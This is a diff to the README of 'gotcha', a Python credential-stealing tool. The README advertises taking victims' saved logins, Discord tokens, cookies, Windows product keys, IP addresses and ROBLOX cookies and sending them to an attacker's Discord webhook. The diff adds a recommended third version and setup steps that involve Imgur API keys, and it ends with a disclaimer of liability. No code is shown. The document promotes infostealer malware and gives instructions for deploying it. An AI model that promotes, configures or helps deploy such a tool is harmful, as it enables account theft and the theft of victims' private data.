@@ -1,7 +1,8 @@
   <h3 align="center">gotcha | simple credentials extraction script, written in Python.</h3>
   <p align="center">
     steal victim's online credentials, discord token, cookies, windows product key & more => all data to your Discord webhook of choice.
-  
+
+# scroll down to the bottom to view the latest version, (3) : this is the one i recommend most.
 ## version 1 : "`gotcha.py`"
 
 utilizes Discord's webhooks : sends victim's credentials, product key, and token. (indiviually)
@@ -41,14 +42,28 @@ all data sent in a neat format, requires a little more effort for setup.
 
 ## instructions => version 2
 
-1. Follow same steps as Version 1, stop at Step 3.
-2. Create an Imgur account, and gain API access : https://api.imgur.com/oauth2/addclient, for more docu. => https://api.imgur.com/
-3. One complete, find the function in "`gotchav2.py`": "upload".
-4. Replace `CLIENT-ID-HERE`, and `CLIENT-SECRET-HERE`: with your Imgur API details, "Client ID", and "Client Secret"
-5. Begin from Step 4 in Version 1.
+1. follow same steps as Version 1, stop at Step 3.
+2. create an Imgur account, and gain API access : https://api.imgur.com/oauth2/addclient, for more docu. => https://api.imgur.com/
+3. once complete, find the function in "`gotchav2.py`": "upload".
+4. replace `CLIENT-ID-HERE`, and `CLIENT-SECRET-HERE`: with your Imgur API details, "Client ID", and "Client Secret"
+5. begin from Step 4 in Version 1.
 
 ### example => "`gotchav2.py`"
 ![](https://cdn.discordapp.com/attachments/799822588296691752/800068801412202516/Capture.PNG)
+---------------------------------------------------
+
+## version 3 : "`gotchav3.py`"
+same functionality as V1 + IP Address, and ROBLOX cookies: code was optimized, and alot more readable + neat.
+| --- |
+all data sent in a neat format, requires a little more effort for setup.
+| --- |
+
+## instructions => version 3
+
+1. follow same steps as Version 2.
+
+### example => "`gotchav3.py`"
+![](https://cdn.discordapp.com/attachments/802665245579149335/803076831006687232/unknown.png)
 
 ## disclaimer : 
 i'm not responsible, nor am i liable for any damages caused by others distributing, or using this for malicious purposes.
